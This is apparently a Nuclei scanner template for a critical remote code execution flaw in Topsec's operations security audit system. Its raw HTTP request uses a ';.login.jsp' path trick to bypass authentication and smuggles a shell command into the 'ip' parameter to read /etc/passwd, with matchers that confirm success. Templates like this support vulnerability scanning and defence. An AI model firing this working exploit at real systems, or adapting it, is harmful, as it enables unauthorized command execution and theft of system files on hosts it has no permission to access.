id: poc-yaml-topsec-topsag-synrequest-rce
info:
  name: "天融信运维安全审计系统 synRequest 远程代码执行漏洞"
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce

http:
  - raw:
      - |
        POST /iam/synRequest.do;.login.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=trace_route&w=1&ip=127.0.0.1|echo%20`cat /etc/passwd`%3b&m=10
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin"
      - type: regex
        regex:
          - "^(?!.*<html).*$"
        part: body
